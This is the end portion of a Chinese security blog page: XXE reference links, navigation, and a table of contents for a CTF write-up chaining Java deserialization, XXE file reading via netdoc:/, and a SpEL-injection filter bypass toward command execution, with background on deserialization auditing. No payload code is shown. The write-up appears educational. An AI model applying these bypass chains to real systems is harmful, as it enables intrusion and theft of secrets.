id="https-depthsecurity-com-blog-exploitation-xml-external-entity-xxe-injection"><a href="#https-depthsecurity-com-blog-exploitation-xml-external-entity-xxe-injection" class="headerlink" title="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection"></a><a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="noopener">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</a></h5><h5 id="http-www-freebuf-com-column-156863-html"><a href="#http-www-freebuf-com-column-156863-html" class="headerlink" title="http://www.freebuf.com/column/156863.html"></a><a href="http://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">http://www.freebuf.com/column/156863.html</a></h5><h5 id="http-www-freebuf-com-vuls-154415-html"><a href="#http-www-freebuf-com-vuls-154415-html" class="headerlink" title="http://www.freebuf.com/vuls/154415.html"></a><a href="http://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/154415.html</a></h5><h5 id="https-xz-aliyun-com-t-2426"><a href="#https-xz-aliyun-com-t-2426" class="headerlink" title="https://xz.aliyun.com/t/2426"></a><a href="https://xz.aliyun.com/t/2426" target="_blank" rel="noopener">https://xz.aliyun.com/t/2426</a></h5><h5 id="http-www-freebuf-com-articles-web-177979-html"><a href="#http-www-freebuf-com-articles-web-177979-html" class="headerlink" title="http://www.freebuf.com/articles/web/177979.html"></a><a href="http://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/177979.html</a></h5><h5 id="http-www-freebuf-com-articles-web-126788-html"><a href="#http-www-freebuf-com-articles-web-126788-html" class="headerlink" title="http://www.freebuf.com/articles/web/126788.html"></a><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a></h5><h5 id="https-www-anquanke-com-post-id-86075"><a href="#https-www-anquanke-com-post-id-86075" class="headerlink" title="https://www.anquanke.com/post/id/86075"></a><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86075</a></h5><h5 id="http-blog-nsfocus-net-xml-dtd-xxe"><a href="#http-blog-nsfocus-net-xml-dtd-xxe" class="headerlink" title="http://blog.nsfocus.net/xml-dtd-xxe/"></a><a href="http://blog.nsfocus.net/xml-dtd-xxe/" target="_blank" rel="noopener">http://blog.nsfocus.net/xml-dtd-xxe/</a></h5><h5 id="http-www-freebuf-com-vuls-176837-html"><a href="#http-www-freebuf-com-vuls-176837-html" class="headerlink" title="http://www.freebuf.com/vuls/176837.html"></a><a href="http://www.freebuf.com/vuls/176837.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/176837.html</a></h5><h5 id="https-xz-aliyun-com-t-2448"><a href="#https-xz-aliyun-com-t-2448" class="headerlink" title="https://xz.aliyun.com/t/2448"></a><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">https://xz.aliyun.com/t/2448</a></h5><h5 id="http-www-freebuf-com-articles-web-97833-html"><a href="#http-www-freebuf-com-articles-web-97833-html" class="headerlink" title="http://www.freebuf.com/articles/web/97833.html"></a><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/97833.html</a></h5><h5 id="https-xz-aliyun-com-t-2249"><a href="#https-xz-aliyun-com-t-2249" class="headerlink" title="https://xz.aliyun.com/t/2249"></a><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a></h5><h5 id="https-www-secpulse-com-archives-6256-html"><a href="#https-www-secpulse-com-archives-6256-html" class="headerlink" title="https://www.secpulse.com/archives/6256.html"></a><a href="https://www.secpulse.com/archives/6256.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/6256.html</a></h5><h5 id="https-blog-netspi-com-playing-content-type-xxe-json-endpoints"><a href="#https-blog-netspi-com-playing-content-type-xxe-json-endpoints" class="headerlink" title="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/"></a><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="noopener">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a></h5><h5 id="https-xz-aliyun-com-t-122"><a href="#https-xz-aliyun-com-t-122" class="headerlink" title="https://xz.aliyun.com/t/122"></a><a href="https://xz.aliyun.com/t/122" target="_blank" rel="noopener">https://xz.aliyun.com/t/122</a></h5><h5 id="https-shiftordie-de-blog-2017-02-18-smtp-over-xxe"><a href="#https-shiftordie-de-blog-2017-02-18-smtp-over-xxe" class="headerlink" title="https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/"></a><a href="https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/" target="_blank" rel="noopener">https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/</a></h5><h5 id="https-blog-csdn-net-u012991692-article-details-80866826"><a href="#https-blog-csdn-net-u012991692-article-details-80866826" class="headerlink" title="https://blog.csdn.net/u012991692/article/details/80866826"></a><a href="https://blog.csdn.net/u012991692/article/details/80866826" target="_blank" rel="noopener">https://blog.csdn.net/u012991692/article/details/80866826</a></h5><h5 id="https-web-in-security-blogspot-com-2016-03-xxe-cheat-sheet-html"><a href="#https-web-in-security-blogspot-com-2016-03-xxe-cheat-sheet-html" class="headerlink" title="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html"></a><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></h5>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/21/Ogeek决赛的部分web复现/" rel="next" title="Ogeek决赛的部分web复现">
                <i class="fa fa-chevron-left"></i> Ogeek决赛的部分web复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/06/sql注入的知识总结/" rel="prev" title="sql注入的知识总结">
                sql注入的知识总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">32</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GoodJava"><span class="nav-number">1.1.</span> <span class="nav-text">GoodJava</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-源码分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目中有用的代码不是很多，下面给出主要的代码。"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目中有用的代码不是很多，下面给出主要的代码。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Server-class"><span class="nav-number">1.2.2.</span> <span class="nav-text">Server.class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#OIS-class"><span class="nav-number">1.2.3.</span> <span class="nav-text">OIS.class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Man-class"><span class="nav-number">1.2.4.</span> <span class="nav-text">Man.class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot"><span class="nav-number">1.2.5.</span> <span class="nav-text">上面的这三个类是主要的，其余的都是空架的代码，采用的框架是sprint-boot</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面开始分析每个类的代码。"><span class="nav-number">1.2.6.</span> <span class="nav-text">下面开始分析每个类的代码。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-Server-class"><span class="nav-number">1.3.</span> <span class="nav-text">0x1 Server.class</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-在Server类中我们可以看到有两个路由-server-admin。并且请求方式都是post，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.在Server类中我们可以看到有两个路由/server,/admin。并且请求方式都是post，但是他们接收的数据类型不同，一个是接收字节流，一个是接收字符串。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-在-server中需要把接收的字节流先base64-decode然后在推到字节数组缓冲流中，然后传到OIS类中实例化。"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.在/server中需要把接收的字节流先base64.decode然后在推到字节数组缓冲流中，然后传到OIS类中实例化。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-最后我们再把数据反序列化出来的时候，指定为我们Man类的特殊过滤。"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.最后我们再把数据反序列化出来的时候，指定为我们Man类的特殊过滤。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-最后回显到页面。"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.最后回显到页面。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-在-admin中我们有两个判断，第一个是通过读取-passwd下的secret，如果我们发送的和他的相等那么就可以绕过。"><span class="nav-number">1.3.5.</span> <span class="nav-text">5.在/admin中我们有两个判断，第一个是通过读取/passwd下的secret，如果我们发送的和他的相等那么就可以绕过。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。"><span class="nav-number">1.3.6.</span> <span class="nav-text">6.第二个判断是一个正则表达式，这个正则表达式把java中常见的执行shell命令的函数给过滤了。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-它使用了Spring空架同时用了SPEL表达式，由于它使用的版本不安全因此存在注入。"><span class="nav-number">1.3.7.</span> <span class="nav-text">7.它使用了Spring空架同时用了SPEL表达式，由于它使用的版本不安全因此存在注入。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-OIS-class"><span class="nav-number">1.4.</span> <span class="nav-text">0x2 OIS.class</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在OIS类中定义了白名单："><span class="nav-number">1.4.1.</span> <span class="nav-text">在OIS类中定义了白名单：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#同时重写了resolveClass方法，重新定义了白名单的类加载名称。"><span class="nav-number">1.4.2.</span> <span class="nav-text">同时重写了resolveClass方法，重新定义了白名单的类加载名称。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3-Man-class"><span class="nav-number">1.5.</span> <span class="nav-text">0x3 Man.class</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这个类重写了readObject定义了反序列化时的特殊处理。"><span class="nav-number">1.5.1.</span> <span class="nav-text">这个类重写了readObject定义了反序列化时的特殊处理。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#不过有段代码我们应该要重视。"><span class="nav-number">1.5.2.</span> <span class="nav-text">不过有段代码我们应该要重视。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上面代码是用来解析xml，可以看到没有任何的限制那么就存在xxe漏洞。"><span class="nav-number">1.5.3.</span> <span class="nav-text">上面代码是用来解析xml，可以看到没有任何的限制那么就存在xxe漏洞。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x4-综上所述："><span class="nav-number">1.6.</span> <span class="nav-text">0x4 综上所述：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-我们要先构造requestStram通过序列化和反序列化的数据进行xxe读取secret的内容。"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.我们要先构造requestStram通过序列化和反序列化的数据进行xxe读取secret的内容。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-我们要进行SPEL注入执行shell命令。"><span class="nav-number">1.6.2.</span> <span class="nav-text">3.我们要进行SPEL注入执行shell命令。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-由于在Man-clss中过滤了file字段因此我们不能用file-协议来读取-passwd下的内容，不要忘记我们现在使用的空架是sprint-boot，那么我们还有一个协议可以替代file-协议，我们可以用netdoc-来任意文件读取。"><span class="nav-number">1.6.3.</span> <span class="nav-text">4.由于在Man.clss中过滤了file字段因此我们不能用file://协议来读取/passwd下的内容，不要忘记我们现在使用的空架是sprint-boot，那么我们还有一个协议可以替代file://协议，我们可以用netdoc:/来任意文件读取。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-对于SPEL注入的过滤我们可以用字符串拼接来绕过。"><span class="nav-number">1.6.4.</span> <span class="nav-text">5.对于SPEL注入的过滤我们可以用字符串拼接来绕过。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-payload1"><span class="nav-number">1.7.</span> <span class="nav-text">0x02 payload1:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#结果如下："><span class="nav-number">1.7.1.</span> <span class="nav-text">结果如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-payload2："><span class="nav-number">1.8.</span> <span class="nav-text">0x03 payload2：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.8.1.</span> <span class="nav-text">结果如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-下面给出xxe的脚本："><span class="nav-number">1.9.</span> <span class="nav-text">0x04 下面给出xxe的脚本：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x05-下面是RCE的脚本："><span class="nav-number">1.9.1.</span> <span class="nav-text">0x05 下面是RCE的脚本：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-下面是java的本地测试代码："><span class="nav-number">1.9.2.</span> <span class="nav-text">0x06 下面是java的本地测试代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这里先留一个坑，用java写个脚本。"><span class="nav-number">1.9.3.</span> <span class="nav-text">这里先留一个坑，用java写个脚本。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-下面是上面用的的各种知识的学习和了解："><span class="nav-number">1.10.</span> <span class="nav-text">0x07 下面是上面用的的各种知识的学习和了解：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-java的序列化反序列化基础。"><span class="nav-number">1.10.1.</span> <span class="nav-text">0x1 java的序列化反序列化基础。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是序列化反序列化："><span class="nav-number">1.10.2.</span> <span class="nav-text">什么是序列化反序列化：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。"><span class="nav-number">1.10.2.1.</span> <span class="nav-text">Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。"><span class="nav-number">1.10.2.2.</span> <span class="nav-text">但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一个类的对象要想序列化成功，必须满足两个条件："><span class="nav-number">1.10.2.3.</span> <span class="nav-text">一个类的对象要想序列化成功，必须满足两个条件：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#该类必须实现-java-io-Serializable-接口。"><span class="nav-number">1.10.3.</span> <span class="nav-text">该类必须实现 java.io.Serializable 接口。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。"><span class="nav-number">1.10.3.1.</span> <span class="nav-text">1.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-如果你想知道一个-Java-标准类是否是可序列化的，可以通过查看该类的文档-查看该类有没有实现-java-io-Serializable接口。"><span class="nav-number">1.10.3.2.</span> <span class="nav-text">2.如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面是一个java的例子："><span class="nav-number">1.10.4.</span> <span class="nav-text">下面是一个java的例子：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对象所属的类："><span class="nav-number">1.10.5.</span> <span class="nav-text">对象所属的类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#将对象序列化为二进制文件："><span class="nav-number">1.10.6.</span> <span class="nav-text">将对象序列化为二进制文件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化是从flag-txt中提取出对象："><span class="nav-number">1.10.7.</span> <span class="nav-text">反序列化是从flag.txt中提取出对象：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。"><span class="nav-number">1.10.8.</span> <span class="nav-text">就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-简单的反序列化漏洞："><span class="nav-number">1.11.</span> <span class="nav-text">0x2 简单的反序列化漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。"><span class="nav-number">1.11.1.</span> <span class="nav-text">在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PS：有时也会使用readUnshared-方法来读取对象，readUnshared-不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。"><span class="nav-number">1.11.2.</span> <span class="nav-text">PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行的逻辑为："><span class="nav-number">1.12.</span> <span class="nav-text">运行的逻辑为：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-UnsafeClass类被序列化进flag-txt文件"><span class="nav-number">1.12.1.</span> <span class="nav-text">1.UnsafeClass类被序列化进flag.txt文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-从flag-txt文件中恢复对象"><span class="nav-number">1.12.2.</span> <span class="nav-text">2.从flag.txt文件中恢复对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-调用被恢复对象的readObject方法"><span class="nav-number">1.12.3.</span> <span class="nav-text">3.调用被恢复对象的readObject方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-命令执行"><span class="nav-number">1.12.4.</span> <span class="nav-text">4.命令执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后代码成功运行。"><span class="nav-number">1.12.5.</span> <span class="nav-text">最后代码成功运行。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化漏洞的起源"><span class="nav-number">1.13.</span> <span class="nav-text">反序列化漏洞的起源</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#开发失误"><span class="nav-number">1.13.1.</span> <span class="nav-text">开发失误</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况："><span class="nav-number">1.13.2.</span> <span class="nav-text">之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。"><span class="nav-number">1.13.2.1.</span> <span class="nav-text">1.重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。"><span class="nav-number">1.13.2.2.</span> <span class="nav-text">2.使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#基础库中隐藏的反序列化漏洞"><span class="nav-number">1.13.3.</span> <span class="nav-text">基础库中隐藏的反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring-MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。"><span class="nav-number">1.13.3.1.</span> <span class="nav-text">优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2015年由黑客Gabriel-Lawrence和Chris-Frohoff发现的‘Apache-Commons-Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。"><span class="nav-number">1.13.3.2.</span> <span class="nav-text">2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#存在危险的基础库："><span class="nav-number">1.13.3.3.</span> <span class="nav-text">存在危险的基础库：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#某反序列化防护软件便是通过禁用以下类的反序列化来保护程序："><span class="nav-number">1.13.4.</span> <span class="nav-text">某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#基础库中的调用流程一般都比较复杂，比如org-apache-commons-collections-functors-InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。"><span class="nav-number">1.13.5.</span> <span class="nav-text">基础库中的调用流程一般都比较复杂，比如org.apache.commons.collections.functors.InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Java反序列化漏洞-玄铁重剑之CommonsCollection-上"><span class="nav-number">1.13.6.</span> <span class="nav-text">Java反序列化漏洞-玄铁重剑之CommonsCollection(上)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Java反序列化漏洞-玄铁重剑之CommonsCollection-下"><span class="nav-number">1.13.7.</span> <span class="nav-text">Java反序列化漏洞-玄铁重剑之CommonsCollection(下)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。"><span class="nav-number">1.13.8.</span> <span class="nav-text">这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何发现Java反序列化漏洞"><span class="nav-number">1.14.</span> <span class="nav-text">如何发现Java反序列化漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#白盒检测"><span class="nav-number">1.15.</span> <span class="nav-text">白盒检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当持有程序源码时，可以采用这种方法，逆向寻找漏洞。"><span class="nav-number">1.15.1.</span> <span class="nav-text">当持有程序源码时，可以采用这种方法，逆向寻找漏洞。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。"><span class="nav-number">1.15.2.</span> <span class="nav-text">反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#流程如下："><span class="nav-number">1.15.3.</span> <span class="nav-text">流程如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#①-通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点"><span class="nav-number">1.15.4.</span> <span class="nav-text">① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以搜索以下函数："><span class="nav-number">1.15.5.</span> <span class="nav-text">可以搜索以下函数：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小数点前面是类名，后面是方法名"><span class="nav-number">1.15.6.</span> <span class="nav-text">小数点前面是类名，后面是方法名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#②-确定了反序列化输入点后，再考察应用的Class-Path中是否包含Apache-Commons-Collections等危险库（ysoserial所支持的其他库亦可）。"><span class="nav-number">1.15.7.</span> <span class="nav-text">② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#③-若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。"><span 